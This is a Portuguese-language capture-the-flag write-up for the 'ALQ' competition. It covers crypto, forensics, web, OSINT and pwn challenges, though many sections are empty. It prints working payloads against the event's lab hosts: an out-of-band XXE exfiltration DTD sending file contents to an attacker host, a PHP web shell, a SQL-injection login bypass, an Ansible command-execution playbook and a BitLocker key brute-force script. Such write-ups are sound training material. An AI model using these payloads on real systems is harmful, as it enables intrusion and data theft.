## Sumário

* [Boot2Root](#boot2root)
    * [UnHide (300)](#unhide-300)
* [Cripto](#cripto)
    * [Cripto 001 (10)](#cripto-001-10)
    * [RSA 001 (10)](#rsa-001-10)
    * [Presente de Aniversário (25)](#presente-de-aniversário-25)
    * [RSA 002 (25)](#rsa-002-25)
    * [Enigma (50)](#enigma-50)
    * [Senha Perdida (50)](#senha-perdida-50)
    * [Mensagem Codificada (100)](#mensagem-codificada-100)
    * [Receita de Bolo (100)](#receita-de-bolo-100)
* [Forense](#forense)
    * [Arquivo Compactado (10)](#arquivo-compactado-10)
    * [Uma Simples Análise (10)](#uma-simples-análise-10)
    * [Break the Hash (25)](#break-the-hash-25)
    * [Um ataque ao banco (25)](#um-ataque-ao-banco-25)
    * [Validação de Dados (25)](#validação-de-dados-25)
    * [Backdoor (50)](#backdoor-50)
    * [Escovando Bits de Rede (50)](#escovando-bits-de-rede-50)
    * [Qual o conteúdo? (50)](#qual-o-conteúdo-50)
    * [Investigação (100)](#investigação-100)
    * [Vazamento de Informações (100)](#vazamento-de-informações-100)
* [Lógica](#lógica)
    * [Sequência (10)](#sequência-10)
    * [Sequência de Collatz (10)](#sequência-de-collatz-10)
    * [Rotas (50)](#rotas-50)
* [Mini Gamer](#mini-gamer)
    * [Adivinha (10)](#adivinha-10)
    * [Pokedex (50)](#pokedex-50)
* [Mini Web](#mini-web)
    * [Navi GPS (10)](#navi-gps-10)
    * [Ship (10)](#ship-10)
    * [Safe URL (25)](#safe-url-25)
    * [Solutions (25)](#solutions-25)
    * [Developer (50)](#developer-50)
    * [MDK (50)](#mdk-50)
    * [External (100)](#external-100)
    * [Mico (100)](#mico-100)
    * [Notes (150)](#notes-150)
    * [Techport (150)](#techport-150)
    * [Defense and Attack (200)](#defense-and-attack-200)
* [Osint](#osint)
    * [Informações de um arquivo! (10)](#informações-de-um-arquivo-10)
    * [Rastreio de IP (10)](#rastreio-de-ip-10)
    * [Dispositivo Antigo (25)](#dispositivo-antigo-25)
    * [Encontre a fotógrafa (25)](#encontre-a-fotógrafa-25)
    * [Hidden Flag (50)](#hidden-flag-50)
    * [Investigação de Voo (50)](#investigação-de-voo-50)
    * [A melhor rua para um gato! (100)](#a-melhor-rua-para-um-gato-100)
* [Outros](#outros)
    * [Look_Find_Replace (10)](#look_find_replace-10)
    * [Looping (10)](#looping-10)
    * [As mãozinhas (25)](#as-mãozinhas-25)
    * [Não é IPv4 (25)](#não-é-ipv4-25)
    * [O Banco Alq (50)](#o-banco-alq-50)
    * [O código obscuro (50)](#o-código-obscuro-50)
    * [Roubo ao Museu (50)](#roubo-ao-museu-50)
    * [Onion Services (100)](#onion-services-100)
    * [Publicidade de Limpeza (100)](#publicidade-de-limpeza-100)
* [Pwn](#pwn)
    * [Pwn01 (10)](#pwn01-10)
    * [Pwn02 (10)](#pwn02-10)
    * [Pwn03 (25)](#pwn03-25)
    * [Oculto.exe (50)](#ocultoexe-50)
    * [Pwn04 (50)](#pwn04-50)
* [Stego](#stego)
    * [Descoberta Histórica (10)](#descoberta-histórica-10)
    * [Quase Igual (10)](#quase-igual-10)
    * [Vaso de decoração (25)](#vaso-de-decoração-25)
    * [Fake Story (50)](#fake-story-50)
    * [Na Deepweb 2 (50)](#na-deepweb-2-50)
    * [Tinta Invisível (50)](#tinta-invisível-50)
    * [A Animação (100)](#a-animação-100)
    * [O lado oculto da lua (100)](#o-lado-oculto-da-lua-100)
    * [Arte (150)](#arte-150)

# Boot2Root

## UnHide (300)
### Descrição
Aplicação PHP com endpoint que permite utilização Arbitrária de Classes e Funções.

### Solução detalhada

Primeiramente, ao acessar unhide.app é possível observar que um código php está sendo executado ao realizar POST requests na pagina.

<img src="images/Pasted image 20230822154123.png">

O código PHP é vulnerável na medida em que permite que um atacante malicioso chame alguma classe com função nociva e cause danos e / ou exfiltre dados da aplicação.

Dessa forma, esses dados estão sendo acessados via json, analise o seguinte request


<img src="images/Pasted image 20230822154210.png">

Na imagem é utilizado a classe DOMDocument, por meio dela é possível fazer chamadas com a função load() que renderiza xml ao passar uma url como argumento.

Nesse contexto, torna-se evidente a possibilidade de exploração de XXE para SSRF ou Local File read.

Para explorar, o conteudo de xml.xml é

```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://iphere:8000/xpl.dtd"> %ext;
%ext;
]>
<r></r>
```

E o conteudo de xpl.dtd é

```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/.htaccess">
<!ENTITY % payload "<!ENTITY &#37; xpl SYSTEM 'http://iphere:8000/?leak=%data;'">
%payload;
%xpl;
```

O qual usa o php para ler o arquivo `/var/www/html/.htaccess` , que contém a flag.

<img src="images/Pasted image 20230822154617.png">

<img src="images/Pasted image 20230822154625.png">

### Flag
```
ALQ{PHP_1nt3rn4ls_F0r_Fun_4nd_Pr0f1t}
```

# Cripto

## Cripto 001 (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## RSA 001 (10)
### Descrição
Arkham incentiva você a aprender sobre RSA. Com os dados do arquivo, pegue a flag.
### Arquivos anexados
rsa_01.txt
```
c = 68861979362313937217341109449187942472677489431259064594664393481393538163263609558838135514001241240414455123424967933524103912542708764016834442464998331552578544296768041973861

e = 3

n = 121620961731804419004021143368532722763668760235699989573151802144418248705170115193101386837082261773971327940315202720151000245641129416506284675906712150736882391279682090167795652477221135577759849554943920194532454895023360059605758650293424537883951541160288234396389432832279299280649201120223904269059
```
### Flag
```
ALQ{br1nc4ndo_c0m_RSA_01}
```
### Solução detalhada
O arquivo ```rsa_01.txt``` havia os valores de C, E, e N, e para descriptografar a mensagem, usamos o site [Dcode](https://www.dcode.fr/rsa-cipher) e preenchemos os campos com as informações recebidas.

<img src="images/Pasted image 20230827161654.png">

## Presente de Aniversário (25)
### Descrição

Bernardino Branca criou uma bebida e deu de presente a seu amigo Arkham. Como sabia que ele gostava de criptografia, deixou uma no rótulo da garrafa para que ele desvendasse.

### Flag

ALQ{F3rnet_eh_facinho_03}

### Solução detalhada

No enunciado no desafio, está escrito o nome de uma pessoa chamada "Bernardino Branca", e procurando por este nome no google, podemos ver que ele criou uma bebida chamado fernet, e existe uma criptografia chamada fernet, e basta usarmos a key e o token para decodar, e pegar a flag.

<img src="images/bernardino.png">
<img src="images/presentedeaniversario.png">

## RSA 002 (25)
### Descrição
Arkham perguntou se aprendeu mais sobre RSA. Um novo arquivo foi dado, pegue a flag.
### Arquivos anexados
rsa_02.txt
```
c = 48511084925420183526614667750002314553245557087216359040164380168157417205838054818182432397825164639931743581979319934170597819562239990100288549990558302029912888160607214

e = 65537

n = 81498020757970999609067174109320139979405492813078153599363977189249525322740350714279156100679701512700773830282784597802936563570271837144481924930802287893627198892230683
```
### Flag
```
ALQ{RSA_m4is_c0mpl3xo_02}
```
### Solução detalhada
O arquivo ```rsa_02.txt``` havia os valores de C, E, e N, e para descriptografar a mensagem, usamos a ferramenta **RsaCtfTool** para resolver o desafio usando o seguinte comando:

```
1. `python3 ./RsaCtfTool.py -n 81498020757970999609067174109320139979405492813078153599363977189249525322740350714279156100679701512700773830282784597802936563570271837144481924930802287893627198892230683 -e 65537 --uncipher 48511084925420183526614667750002314553245557087216359040164380168157417205838054818182432397825164639931743581979319934170597819562239990100288549990558302029912888160607214`
```

<img src="images/Pasted image 20230827163351.png">

## Enigma (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Senha Perdida (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Mensagem Codificada (100)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Receita de Bolo (100)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

# Forense

## Arquivo Compactado (10)
### Descrição

O meu Deus, como faço para conseguir ler o meu arquivo, já que esqueci a senha? Quem pode me ajudar?

### Arquivos anexados

### Flag

ALQ{s3nha_qu3brad@}

### Solução detalhada

Basicamente este desafio consistia em quebrar a senha do zip, e pegar a flag.

<img src="images/arquivocompactado.png">

## Uma Simples Análise (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Break the Hash (25)
### Descrição

Aconteceu alguma coisa na hora de copiar a hash que não consigo mais quebra-la.

48bb6e862e54f2a795ffc4e541caed4dk

Adicione o resultado dentro da flag ALQ{senha-quebrada}

### Flag

ALQ{easy}

### Solução detalhada

A hash md5 estava com um char a mais, que seria o "k", removendo esse "k", e utilizando o decrypt md5 do dcode.fr, teremos a flag.

<img src="images/breakthehash.png">

## Um ataque ao banco (25)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Validação de Dados (25)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Backdoor (50)
### Descrição

Uma máquina no qual o objetivo é identificar uma backdoor (Pam Backdoor).

### Flag

ALQ{pam_unix.so}

### Descrição detalhada

Ao entrar no ssh, podemos usar a mesma senha do usuario ubuntu para se tornar root. Após isso, ao ir no /root, poderiamos ver o linpeas.sh e o pspy64 (isso foi colocado propositalmente na máquina).

Rodando o linpeas, você verá que existe um arquivo chamado "/usr/include/type.h"

<img src="images/img.png">

Ao visualizar esse arquivo, podemos ver a senha do usuário ubuntu, e a senha do usuário root.

<img src="images/img2.png">

Pesquisando por "type.h" "pam" backdoor, chegamos a um repositorio no github, no qual o author cria uma ferramenta pra backdoor chamada de Pam Backdoor.

<img src="images/img3.png">

<img src="images/img4.png">

## Escovando Bits de Rede (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Qual o conteúdo? (50)
### Descrição
Um pendrive foi catalogado e feito uma imagem do seu conteúdo e disponibilizado para você. Também foi achado um arquivo com uma possível chave de recuperação do pendrive no computador do suspeito.

[Link para download](https://drive.google.com/drive/folders/1YsVshTD4ubztsWktBgjzxRCHfYinM0F9?usp=sharing)

Use suas habilidades forenses para descobrir o conteúdo do pendrive e indicar qual o nome do arquivo suspeito que foi encontrado a flag?

Identifique o arquivo adicionando **ALQ{nome_do_arquivo.ext}** para pontuar.

### Arquivos anexados

recover.TXT
```
Chave de recuperação de Criptografia de Unidade de Disco BitLocker 

Para verificar se esta é a chave de recuperação correta, compare o início do identificador a seguir com o valor do identificador exibido no computador.

Identificador:

	3164EECD-FD52-468C-8E60-DD1E6B79B7DD

Se o identificador acima corresponder ao que é exibido no computador, use a chave a seguir para desbloquear a unidade.

Chave de Recuperação:

	241802-225181-211574-115874-304095-169257-617353-52xxxx

Se o identificador acima não corresponder ao que é exibido no computador, significa que esta não é a chave correta para desbloquear a unidade.
Tente usar outra chave de recuperação ou consulte https://go.microsoft.com/fwlink/?LinkID=260589 para obter assistência.
```
### Flag
```
ALQ{main.cfg}
```
### Solução detalhada
Começamos montando a imagem VHD do pendrive em um sistema operacional Windows.

<img src="images/Pasted image 20230827153352.png">

<img src="images/Pasted image 20230827154128.png">

<img src="images/Pasted image 20230827154327.png">

<img src="images/Pasted image 20230827154402.png">

A única informação que tínhamos era a chave de recuperação, que estava faltando os últimos 4 dígitos finais.

Analisando o arquivo ```recover.TXT```, percebemos a falta dos 4 últimos dígitos da chave de recuperação BitLocker. Geramos um código Batch com a ajuda do ChatGPT para fazer um ataque de força bruta para descobrir os 4 dígitos finais da chave de recuperação.

Código Batch para ataque de força bruta na chave de recuperação BitLocker:
```
@echo off
setlocal enabledelayedexpansion

set "base_recovery_password=241802-225181-211574-115874-304095-169257-617353-52"
set "last_digits=0000"

:loop
if %last_digits% leq 9999 (
    set "full_recovery_password=%base_recovery_password%%last_digits%"
    echo Trying: %full_recovery_password%
    
    manage-bde -unlock D: -RecoveryPassword !full_recovery_password!
    
    set /a "last_digits+=1"
    goto loop
)

echo All combinations tried.
pause
```

Por ser um script incompleto, tivemos que procurar no output quais eram os últimos 4 dígitos, que eram ```4634```.

Chave de recuperação BitLocker completa:
```
241802-225181-211574-115874-304095-169257-617353-524634
```

<img src="images/Pasted image 20230827154744.png">

<img src="images/Pasted image 20230827154813.png">

Com a partição desbloqueada, verificamos os arquivos presentes.

<img src="images/Pasted image 20230827154915.png">

Posteriormente ao encontrar a falsa flag, decidimos verificar a partição mais a fundo, fazendo uma investigação forensic utilizando a ferramenta conhecida como Autopsy.

<img src="images/Pasted image 20230827155214.png">

<img src="images/Pasted image 20230827155316.png">

Começamos a observa a data de criação e modificação dos arquivos da partição, e descobrimos que a data de modificação e criação do arquivo ```flag.txt``` era diferente, ele foi modificado 30 segundos depois de ser criado.

<img src="images/Pasted image 20230827155719.png">

Clicamos em "File Created" para analisarmos o que foi modificado nesse horário. Encontramos 2 arquivos modificados.

<img src="images/Pasted image 20230827155831.png">

Ao observar o conteúdo de ```/grub/main.cfg```, encontramos alguns valores estranhos.

<img src="images/Pasted image 20230827155932.png">

Copiamos o valor e colamos na ferramenta CyberChef, que rapidamente detectou a cifra.

<img src="images/Pasted image 20230827160051.png">

Então a flag final era ```ALQ{main.cfg}```.

## Investigação (100)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Vazamento de Informações (100)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

# Lógica

## Sequência (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Sequência de Collatz (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Rotas (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

# Mini Gamer

## Adivinha (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Pokedex (50)
### Descrição
nc 45.63.104.42 2345

### Arquivos anexados
pokedex.c

```
#include <stdio.h>
#include <stdlib.h>
int main()
{
    int con;
    con = 0;
    int account_balance = 1100;
    while(con == 0){
        
        printf("Bem-vindo à loja de trocas de Pokémon\n");
        printf("Aqui trocamos Pokémons\n\n");

        printf("1. Verificar saldo de moedas\n");
        printf("2. Trocar por Pokémons\n");
        printf("3. Sair\n\n");
        
        int menu;
        
        printf("Escolha uma opção no menu: ");
        fflush(stdout);
        fflush(stdin);
        scanf("%d", &menu);
        if(menu == 1){
            printf("\n - Saldo: %d \n\n", account_balance);
        }
        else if(menu == 2){
            printf("\nAtualmente disponíveis para troca: \n\n");
            printf("1. Pikachu\n");
            printf("2. Charizard 1337\n\n");
            printf("Escolha: ");
            fflush(stdout);
            int auction_choice;
            fflush(stdin);
            scanf("%d", &auction_choice);
            if(auction_choice == 1){
                printf("\nEsse Pokémom custa 900 moedas cada, insira a quantidade desejada: ");
                fflush(stdout);
                int number_pokemons = 0;
                fflush(stdin);
                scanf("%d", &number_pokemons);
                if(number_pokemons > 0){
                    int total_cost = 0;
                    total_cost = 900*number_pokemons;
                    printf("\nO custo final é: %d\n", total_cost);
                    
                    if(total_cost <= account_balance){
                        account_balance = account_balance - total_cost;
                        printf("\nSeu saldo atual após a transação: %d\n\n", account_balance);
                    }
                    else{
                        printf("Saldo insuficiente para completar a transação\n");
                    }
                    fflush(stdout);
                }
            }
            else if(auction_choice == 2){
                printf("\nCharizard 1337 custa 100000 moedas, e só temos 1 em estoque.\n\n");
                printf("Digite 1 para comprar: ");
                int bid = 0;
                fflush(stdout);
                fflush(stdin);
                scanf("%d", &bid);
                
                if(bid == 1){
                    
                    if(account_balance > 100000){
                        FILE *f = fopen("flag.txt", "r");
                        if(f == NULL){
                            printf("Flag não encontrada, por favor execute isso no servidor.\n");
                            exit(0);
                        }
                        char buf[64];
                        fgets(buf, 63, f);
                        printf("SEU POKEMON É: %s\n", buf);
                        }
                    
                    else{
                        printf("\n - Saldo insuficiente para a transação.\n\n");
                    }}
            }
            fflush(stdout);
        }
        else{
            con = 1;
        }

    }
    fflush(stdout);
    return 0;
}
```
### Flag
```
ALQ{pok3m00n_th3_flag}
```
### Solução detalhada
O código C se tratava de um sistema de pokedex, onde você podia ver seu saldo e trocar de pokemon. A função mais próxima da flag era a de trocar de pokemon, especificamente trocar pelo Charizard.

Linhas de códigos relacionadas a compra do pokemon Pikachu:
```
if(auction_choice == 1){
	printf("\nEsse Pokémom custa 900 moedas cada, insira a quantidade desejada: ");
	fflush(stdout);
	int number_pokemons = 0;
	fflush(stdin);
	scanf("%d", &number_pokemons);
	if(number_pokemons > 0){
		int total_cost = 0;
		total_cost = 900*number_pokemons;
		printf("\nO custo final é: %d\n", total_cost);
		
		if(total_cost <= account_balance){
			account_balance = account_balance - total_cost;
			printf("\nSeu saldo atual após a transação: %d\n\n", account_balance);
		}
		else{
			printf("Saldo insuficiente para completar a transação\n");
		}
		fflush(stdout);
	}
}
```

Ao analisar as linhas de códigos relacionadas a compra do pokemon Pikachu, é possível observar que há uma vulnerabilidade conhecida como **integer overflow**, ou, estouro de números inteiros:

```
scanf("%d", &number_pokemons);
if(number_pokemons > 0){
	int total_cost = 0;
	total_cost = 900*number_pokemons;
	printf("\nO custo final é: %d\n", total_cost);
	
	if(total_cost <= account_balance){
		account_balance = account_balance - total_cost;
		printf("\nSeu saldo atual após a transação: %d\n\n", account_balance);
	}
```

Após chegar essa conclusão, a vulnerabilidade foi explorada após a escolha do pokemon Pikachu e sua quantidade, onde o payload usado foi ```10000000000000```.

<img src="images/Pasted image 20230827141553.png">

<img src="images/Pasted image 20230827141636.png">

# Mini Web

## Navi GPS (10)
### Descrição

### Solução detalhada

Na aplicação, percebe-se que há a utilização do parametro 'q' para chamar arquivos php no systema.

<img src="images/Pasted image 20230822154905.png">

Dessa maneira, é vulneravél a LFI:

<img src="images/Pasted image 20230822154933.png">

## Ship (10)
### Descrição

### Solução detalhada
Reside na aplicação o endpoint de login

<img src="images/Pasted image 20230822155111.png">

Após análise do código do front end, é achado o arquivo /assets/js/login.js sendo usado.

Lendo esse arquivo, encontram-se credenciais expostas as quais permitem que o atacante acesse o painel

<img src="images/Pasted image 20230822155159.png">

<img src="images/Pasted image 20230822155219.png">

## Safe URL (25)
### Descrição

### Solução detalhada

Aplicação roda um endpoint que provavelmente é vulnerável a SSRF.

<img src="images/Pasted image 20230822155258.png">


Antes de testar pelo ssrf, o código fonte da aplicação mostra algo interessante, um arquivo config.php.

<img src="images/Pasted image 20230822155418.png">

Assim, podemos testar por meio do SSRF e chamar http://127.0.0.1/config.php
<img src="images/Pasted image 20230822155523.png">

E assim obtemos a flag

## Solutions (25)
### Descrição

### Solução detalhada

Nesse cenário, identifica-se a tecnologia ansible sendo usada por meio de uploads sem nenhuma restrição ou filtro, o mesmo pode causar execução remota de comandos na aplicação.

<img src="images/Pasted image 20230822155913.png">


Usando o seguinte yaml
```yaml
- hosts: localhost
  tasks:
    - name: RShell2
      shell: bash -c 'cat /flag.txt >> /var/www/html/index2.html'
```
Podemos pegar a flag criando uma nova index no servidor, e depois ler ela

1. Envie o arquivo para a aplicação
2. Execute-o
3. Acesse index2.html


<img src="images/Pasted image 20230822160126.png">


<img src="images/Pasted image 20230822160140.png">

Flag - ALQ{D3v0ops_4ns1ble_pl4yb00k_Rc3}

## Developer (50)
### Descrição

### Solução detalhada

Observa-se um painel de login na aplicação, que, ao testar, bypassamos o login que é vulnerável a SQL Injection com o payload: ' or 1 -- -

<img src="images/Pasted image 20230822160343.png">


<img src="images/Pasted image 20230822160251.png">


Na pagina settings, iremos abusar da função de File Upload para executar o ataque Unrestricted File upload, permitindo-nos colocar uma web shell no servidor que ira executar comandos.

<img src="images/Pasted image 20230822161455.png">


Crie um arquivo com o seguinte conteudo
```php
<?php echo system($_GET['rce']);?>
```

Acesse-o pelo endpoint /uploads/

<img src="images/Pasted image 20230822161305.png">

Flag - ALQ{P0UC4VULNPR4MU1TOC0D3}

## MDK (50)
### Descrição

### Solução detalhada

Ao entrar na pagina, identificamos uma pagina de login e register

<img src="images/Pasted image 20230827093404.png">


Ao logar, a pagina exibida mostra algumas funções,<img src="images/Pasted image 20230827093501.png">

A função All tools retorna Access Denied, o que nos faz perceber que existe alguma Authenticação que cuida de premium users, que portanto pode ser explorada.
<img src="images/Pasted image 20230827093624.png">Retornando a página, analisando os cookies, identifica-se o uso de jwt, assim, decido jogar ele no site jwt.io

<img src="images/Pasted image 20230827093819.png">

E a tal categoria premium está setada para false,
Usando o cyberchef, iremos alterar esse valor para true

<img src="images/Pasted image 20230827113357.png">

Depois, acesse a página novamente

<img src="images/Pasted image 20230827113425.png">

E obtemos a flag.

## External (100)
### Descrição

### Solução detalhada

<img src="images/Pasted image 20230827121828.png">

Ná pagina principal, existe o botão Contact.
Clicando nele, chegamos a pagina contact.php

<img src="images/Pasted image 20230827121905.png">

<img src="images/Pasted image 20230827122103.png">
Ao interceptar a request, percebe-se que está sendo usado XML. Nesse contexto, o backend está renderizando os dados enviados pelo cliente usando XML sem nenhum tipo de proteção.

Nesse caso, é evidente o possível ataque de XXE, o qual explora esse tipo de função para atingir Local File Read ou SSRF.

Enviando o request, o nome é retornado, então é possível usar o nome para refletir um conteúdo do sistema ( Local File Read )


<img src="images/Pasted image 20230827122217.png">

Exploração:

<img src="images/Pasted image 20230827122342.png">

Payload usado:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///flag.txt"> ]>
<contact><first_name>&ent;</first_name><last_name>test</last_name><email>test@gmail.com</email><message>testando</message></contact>
```

Flag: ALQ{XML_3xt3rn4L_3nt1ty_Att4ck_}

## Mico (100)
### Descrição

### Solução detalhada

<img src="images/Pasted image 20230827094017.png">

Neste CTF MICO, na aplicação existem varios endpoins .html, e uma aparente forma de login e sign up que no entanto não funciona.

Depois de analisar e passar pelas paginas, não foi encontrado nada. Assim, ao não encontrar nada, meu time teve a ideia de começar a analisar o que já teria passado pelo site, então, fizemos o uso de crawlers.

Crawler:
```
https://ctf-mico.alquymia.com.br/
https://ctf-mico.alquymia.com.br/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js
https://ctf-mico.alquymia.com.br/contact.html
https://ctf-mico.alquymia.com.br/css/bootstrap.css
https://ctf-mico.alquymia.com.br/css/font-awesome.min.css
https://ctf-mico.alquymia.com.br/css/responsive.css
https://ctf-mico.alquymia.com.br/css/style.css
https://ctf-mico.alquymia.com.br/doctor.html
https://ctf-mico.alquymia.com.br/favicon.ico
https://ctf-mico.alquymia.com.br/fonts/fontawesome-webfont.woff2?v=4.7.0
https://ctf-mico.alquymia.com.br/images/about-img.jpg
https://ctf-mico.alquymia.com.br/images/contact-img.jpg
https://ctf-mico.alquymia.com.br/images/dots.png
https://ctf-mico.alquymia.com.br/images/logo.png
https://ctf-mico.alquymia.com.br/images/next.png
https://ctf-mico.alquymia.com.br/images/post1.jpg
https://ctf-mico.alquymia.com.br/images/post2.jpg
https://ctf-mico.alquymia.com.br/images/post3.jpg
https://ctf-mico.alquymia.com.br/images/post4.png
https://ctf-mico.alquymia.com.br/images/prev.png
https://ctf-mico.alquymia.com.br/images/slider-img.jpg
https://ctf-mico.alquymia.com.br/images/t1.png
https://ctf-mico.alquymia.com.br/images/t2.png
https://ctf-mico.alquymia.com.br/images/t3.png
https://ctf-mico.alquymia.com.br/images/t4.png
https://ctf-mico.alquymia.com.br/images/team1.jpg
https://ctf-mico.alquymia.com.br/images/team2.jpg
https://ctf-mico.alquymia.com.br/images/team3.jpg
https://ctf-mico.alquymia.com.br/images/treatment-side-img.jpg
https://ctf-mico.alquymia.com.br/js/bootstrap.js
https://ctf-mico.alquymia.com.br/js/custom.js
https://ctf-mico.alquymia.com.br/js/jquery-3.4.1.min.js
https://ctf-mico.alquymia.com.br/robots.txt
https://ctf-mico.alquymia.com.br/testimonial.html
```

Nele, verificamos a existencia de https://ctf-mico.alquymia.com.br/robots.txt, que ao entrar na url, dizia 404. Nesse contexto, começamos a pensar o por que não estaria ali, que nos levou ao seguinte pensamento: "Será que algums arquivos / folders foram escondidos?", assim passamos a usar o wayback machine para verificar.

Ao usar o wayback machine para verificar a existência de robots.txt, obtivemos uma resposta muito interessante:

<img src="images/Pasted image 20230827094540.png">

<img src="images/Pasted image 20230827094558.png">

Foi comprovada a existência de um folder com nome db-0898343234/

ao acessar ele, é retornado forbidden, mas ao entrar em db-0898343234/flag.txt, encontramos a flag.

<img src="images/Pasted image 20230827094701.png">

Flag: ALQ{hidden_wayback}

## Notes (150)
### Descrição

### Solução detalhada

<img src="images/Pasted image 20230827094924.png">

Primeira página da aplicação, mostra Sign in e Sign up.
Dessa maneira, vamos criar uma conta e logar.

<img src="images/Pasted image 20230827095117.png">

A aplicação roda algo como um sistema de notas, o qual utiliza ID's para chamar notes salvadas.

<img src="images/Pasted image 20230827095155.png">

Assim, torna-se evidente uma possível exploração de IDOR, visto que existe a utilização de ID's para identificação de objetos no servidor sem nenhum tipo de filtro ou proteção.

Ao percorrer os ID's possíveis, encontra-se a flag no ID 35

<img src="images/Pasted image 20230827095417.png">

Flag: ALQ{1ns3cur3_d1r3cT_0bj3cT_R3f3r3nc3s}

## Techport (150)
### Descrição

### Solução detalhada

<img src="images/Pasted image 20230827095608.png">

Primeira página da aplicação, mostra algums lorem ipsum, e um botão de dashboard no canto superior direito.

Ao clicar, é obtido um erro:
<img src="images/Pasted image 20230827095641.png">

A Aplicação web está utilizando de um parametro chamado auth para setar se o usuário está autenticado ou não.

Assim, executamos o ataque trocando o valor para true, para dizer que estamos autenticados para o servidor web.

<img src="images/Pasted image 20230827095752.png">

## Defense and Attack (200)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

# Osint

## Informações de um arquivo! (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Rastreio de IP (10)
### Descrição

Um hacker conseguiu invadir um sistema de câmera de um hospital, mas antes de desconectar um dos funcionários da equipe de TI conseguiu capturar um IP de origem: 177.45.70.184. A partir dessa evidência descubra o ownerid desse IP e responda com a resposta no padrão solicitado. Exemplo: ALQ{respostadapergunta}

### Flag

ALQ{02.558.157/0001-62}

### Solução detalhada

Para resolvermos este desafio, é bem simples, basta apenas usarmos o whois, e usar o grep no ownerid deste endereço de ip: 177.45.70.184

<img src="images/ownerid.png">

## Dispositivo Antigo (25)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Encontre a fotógrafa (25)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Hidden Flag (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Investigação de Voo (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## A melhor rua para um gato! (100)
### Fiquei sabendo por uma amiga Thayse, que existe um canto onde os gatos se sentem super felizes, ficam sempre miando, mas infelizmente não conseguir achar. Só sei que a rua fica no Raleigh, NC, USA. Pontue com o nome da rua dentro da flag ALQ{nome-da-rua-igual-ao-google}

### OBS: O nome da rua é separado por - 
### OBS1: O nome é conforme está no Google.

### Arquivos anexados

A melhor rua para um gato!

### ALQ{Mial-St}

### Solução detalhada

 O proprio enunciado dessa challenge nos deu uma pista, sobre como achar essa tal rua.

 <img src="images/miau.png">

 Procurando pela Raleigh, NC, USA no google maps, e adicionando miau, podemos ver a seguinte rua.

 <img src="images/fmiau.png">

 Agora ao clicarmos naquele endereço no google maps, podemos ver uma rua chamada Miaul St, e essa é a nossa flag.

 <img src="images/miaul.png">

# Outros

## Look_Find_Replace (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Looping (10)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## As mãozinhas (25)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Não é IPv4 (25)
### Descrição

Scanning no Ipv6 usando nmap + usando nc para se conectar no ipv6 na porta 3335 e por fim, um simples buffer overflow.

### Flag

ALQ{Buffer_over_cmd}

### Solução detalhada

Essa challenge, consistia em fazer um scan no ipv6 usando nmap (a flag -6 do nmap é utilizada para fazer scanning/varredura em um ipv6), após encontrar as portas abertas, podemos ver uma porta "3335", podemos utilizar o nc -6 para se conectar nela, quando nos conectamos nos deparamos com um simples buffer overflow, e é so prencher com vários "A", que o buffer estoura, e obtemos a flag.

Comando utilizado no nmap: nmap -vvv -p- -6 2001:19f0:5:14f0:5400:4ff:fe78:b66c

<img src="images/portasipv6.png">
<img src="images/simplebof.png">

## O Banco Alq (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## O código obscuro (50)
### Descrição

### Arquivos anexados

### Flag

### Solução detalhada

## Roubo ao Museu (50)
### Descrição
Atenção, falou o **Arkham** a policia local, roubaram um quadro de arte e deixaram apenas uma carta com códigos bem estranhos.

<img src="images/Pasted image 20230827150604.png">

### Arquivos anexados
carta.txt

```
D'`_@?K\~5k92xwvR-?+=M_^nJ7#"h~DCA@@b=_;)yrqpotm3qpoQPlkd*bg`e^]#aC_X|\>=YXWPOs65KJOHlL.JIHG@dDCB$@?>=<5Y3876/.3,P0po'&+$#(!E%$dc!x>|{z\xwp6tVrkjoh.fNjc)gfH%cbaZYX|\>=YXQuUTMRQJnHMLKDhHGFEDCB;_"!7[|{9870Tut,+0)M-,+$#G!~D$#zy~wv<tsxqpo5sUkpih.lkjLKa'edFEa`_X|\>=YXWPOsSR43ImM/EDCgAF?>=a;@98=<;4X8xw/43,P0)o'&J$#(!~D|B"!x}|u;yxZvo5Vlqpih.fN+iKJ`ed]b[!_X]VzZ<Rv9ONSRQJIm0/KJCBAeE>&<`#?8\<5{3Wxw/43,P0/.-m%*#G'&%$#"baw=uzyxqpo5sUkpohg-kjLKgfed]#DZYX|V[ZYXWPOs65QJnNG/EiCBGF?cCB;:?8\<5{3W10T4ts10)Mnm%*#"Fg}|{Aba}v{ts9Zvo5srqSi/gfkdib(Ie^]ba`Y}]\[Z<RvV8NSRKJn1MFj-,HGF?>b<;:?87[;:z81Uvu-2+Op.'&%I)(h&}|#"y?}_{t:[q7$
```
### Flag
```
ALQ{m4lb0lg3_3h_c0isa_d3_l0uco}
```
### Solução detalhada
